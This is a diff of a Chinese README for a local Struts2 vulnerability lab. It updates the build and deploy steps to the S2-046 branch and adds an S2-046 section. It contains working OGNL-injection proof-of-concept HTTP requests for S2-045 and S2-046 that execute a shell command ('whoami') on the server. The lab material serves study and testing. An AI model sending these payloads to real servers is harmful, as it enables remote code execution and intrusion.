@@ -10,14 +10,14 @@ git branch -a
 
 3.切换到分支
 git checkout 分支名
-如git checkout S2-045
+如git checkout S2-046
 
 4.打包
 mvn clean package
 
 5.部署在Tomcat中
-将\target中生成的Struts2-045.war复制到Tomcat下的webapps目录中，然后开启Tomcat
-访问http://127.0.0.1:8080/Struts2-045/index.action
+将\target中生成的Struts2-046.war复制到Tomcat下的webapps目录中，然后开启Tomcat
+访问http://127.0.0.1:8080/Struts2-046/index.action
 
 # 相关信息
 
@@ -118,7 +118,7 @@ CVE-2017-5638
 
 影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
 
-官方公告：暂无
+官方公告：
 http://struts.apache.org/docs/s2-045.html
 https://cwiki.apache.org/confluence/display/WW/S2-045
 
@@ -133,3 +133,30 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
 Content-Length: 2
+
+
+10.S2-046
+
+CVE-2017-5638
+
+影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
+
+官方公告：
+http://struts.apache.org/docs/s2-046.html
+https://cwiki.apache.org/confluence/display/WW/S2-046
+
+POC:
+
+POST /Struts2-046/index.action HTTP/1.1
+Host: 127.0.0.1:8080
+Accept: */*
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
+Connection: close
+Content-Length: 8850000
+
+------WebKitFormBoundaryXd004BVJN9pBYBL2
+Content-Disposition: form-data; name="foo"; filename="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+Content-Type: text/plain
+
+foo
+------WebKitFormBoundaryXd004BVJN9pBYBL2--
